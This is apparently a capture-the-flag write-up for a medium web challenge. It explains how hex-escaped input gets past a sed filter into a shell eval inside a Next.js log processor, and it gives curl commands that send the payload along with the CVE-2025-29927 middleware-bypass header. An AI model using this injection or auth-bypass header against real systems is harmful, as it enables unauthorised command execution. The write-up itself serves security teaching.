# <div align="center"><span style="color:#f03c15">COMMAND INJECTION IN THE LOGS</span></div>

<div align="center">
  <h2 style="color:#4287f5">AISEC ENSA MARRAKECH CTF 2025</h2>
  <p><b>Challenge Creator</b>: hmidal3yan | <b>Difficulty</b>: <span style="color:#f59e0b">Medium</span> | <b>Category</b>: <span style="color:#10b981">Web Exploitation</span></p>
  <hr style="border: 1px solid #ddd; margin: 20px 0">
</div>

## <span style="color:#38bdf8">TARGET OVERVIEW</span>

This Next.js application records user interactions in log files. The critical vulnerability exists in how the system processes the `User-Agent` field in the `contact.log` file - specifically, an unsafe `eval` command that gives us our foothold.

### <span style="color:#a855f7">System Constraints:</span>
- <span style="color:#ef4444">⚠️</span> The filter script runs with limited user privileges (`filteruser`)
- <span style="color:#ef4444">⚠️</span> Available commands are restricted to those in `/restricted/bin`
- <span style="color:#ef4444">⚠️</span> Flag requires activation via the `flag` command before retrieval
- <span style="color:#ef4444">⚠️</span> Flag is only accessible for 2 minutes after activation
- <span style="color:#ef4444">⚠️</span> Special cookie required to access the flag endpoint

## <span style="color:#38bdf8">ATTACK SURFACE</span>

<div style="background-color:#1e293b; padding:15px; border-radius:5px;">
The application exposes several attack vectors:

```
┌─────────────────┐       ┌──────────────┐       ┌───────────────┐
│                 │       │              │       │               │
│  Contact Form   │──────▶│  Log Files   │──────▶│ Filter Script │
│  /api/contact   │       │ contact.log  │       │ (vulnerable)  │
│                 │       │              │       │               │
└─────────────────┘       └──────────────┘       └───────────────┘
                                                         │
                                                         │
                                                         ▼
┌─────────────────┐       ┌──────────────┐       ┌───────────────┐
│                 │       │              │       │               │
│  Flag Endpoint  │◀──────│ Flag Checker │◀──────│ Filtered Logs │
│ /api/i7tiramati │       │              │       │               │
│                 │       └──────────────┘       └───────────────┘
└─────────────────┘
```
</div>

### <span style="color:#a855f7">Key API Endpoints:</span>
- <span style="color:#f97316; font-weight:bold">POST /api/contact</span>: Logs User-Agent to `contact.log` (our injection point)
- <span style="color:#f97316; font-weight:bold">GET /api/logs</span>: Retrieves processed logs from `logs/filtered`
- <span style="color:#f97316; font-weight:bold">GET /api/i7tiramati</span>: Returns the flag (requires authentication + activation)

## <span style="color:#ef4444">CRITICAL VULNERABILITY</span>

<div style="background-color:#fef2f2; color:#7f1d1d; padding:15px; border-radius:5px; border-left:4px solid #ef4444">
The filter script processes log entries with a dangerous pattern:

```bash
# Vulnerable code in filter.sh
sanitized=$(echo "$user_agent" | sed 's/[;&|`$()]//g')
decoded=$(printf '%b' "$sanitized")
processed=$(eval "echo \"$decoded\"")
```

This unsafe `eval` is badly sanitized and allows use to use Hexa to bypass the sanitization and execute arbitrary commands when our payload is processed by the filter script.
</div>

## <span style="color:#10b981">EXPLOITATION WALKTHROUGH</span>

<div style="display:flex; margin-bottom:20px;">
  <div style="flex:1; padding:10px; background-color:#ecfdf5; border-radius:5px; margin-right:10px; border-left:4px solid #10b981">
    <h3 style="color:#10b981">PHASE 1: RECONNAISSANCE</h3>
    <ol>
      <li>Examine the application structure</li>
      <li>Identify the vulnerable log processing mechanism</li>
      <li>Understand the flag activation requirements</li>
    </ol>
  </div>
  
  <div style="flex:1; padding:10px; background-color:#eff6ff; border-radius:5px; margin:0 10px; border-left:4px solid #3b82f6">
    <h3 style="color:#3b82f6">PHASE 2: PAYLOAD CRAFTING</h3>
    <p>We need to:</p>
    <ul>
      <li>Inject a command that executes the `flag` command</li>
      <li>Obtain the special cookie by using `\x24\x28flag\x29` as our User-Agent</li>
      <li>Prepare for accessing the flag endpoint</li>
    </ul>
  </div>
  
  <div style="flex:1; padding:10px; background-color:#fef2f2; border-radius:5px; margin-left:10px; border-left:4px solid #ef4444">
    <h3 style="color:#ef4444">PHASE 3: EXPLOITATION</h3>
    <ol>
      <li>Submit a contact form with our crafted User-Agent payload</li>
      <li>Wait for the filter script to process our payload (runs every 3 minutes)</li> 
      <li>Confirm flag activation (writes "1" to `/tmp/.flag_activated`)</li>
      <li>Access `/api/i7tiramati` with the acquired cookie</li>
    </ol>
  </div>
</div>

## <span style="color:#f59e0b">EXPLOITATION TOOLS</span>

<div style="background-color:#1e293b; padding:15px; border-radius:5px;">

```bash
# Crafting payload with curl
curl -X POST http://target:3000/api/contact \
  -H "Content-Type: application/json" \
  -H "User-Agent: \x24\x28flag\x29" \
  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
  -d '{"name":"hacker","email":"exploit@test.com","message":222 /to cause ERROR/}'
THAT IS THE PAYLOAD STRUCTURE BUT IT IS BETTER TO USE POSTMAN OR BURPSUITE so you capture the cookie returned to the user.
# Retrieving flag
curl -X GET http://target:3000/api/i7tiramati \
      -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
      -H "Cookie: special_cookie=value_from_response"
```
</div>

## <span style="color:#38bdf8">REAL-WORLD CONNECTIONS</span>

This challenge draws inspiration from CVE-2025-29927, a Next.js middleware bypass vulnerability where attackers could bypass authentication by adding a specific header:

<div style="background-color:#1e293b; padding:15px; border-radius:5px; color:#94a3b8; font-family:monospace;">
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
</div>

While our challenge focuses on command injection rather than middleware bypass, both exploits demonstrate how HTTP headers can be weaponized to compromise application security.
